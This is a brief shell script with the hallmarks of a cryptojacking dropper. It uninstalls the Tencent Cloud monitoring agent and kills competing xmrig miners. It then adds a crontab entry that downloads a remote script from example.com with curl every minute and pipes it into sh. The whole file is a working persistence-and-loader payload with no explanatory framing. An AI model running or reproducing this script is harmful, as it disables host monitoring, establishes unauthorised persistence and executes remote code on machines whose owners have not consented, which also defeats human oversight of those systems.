#!/bin/sh
LDR="curl"
/usr/local/qcloud/stargate/admin/uninstall.sh
pkill -f xmrig
(
  crontab -l 2>/dev/null
  echo "* * * * * $LDR https://example.com/script.sh | sh"
) | crontab -
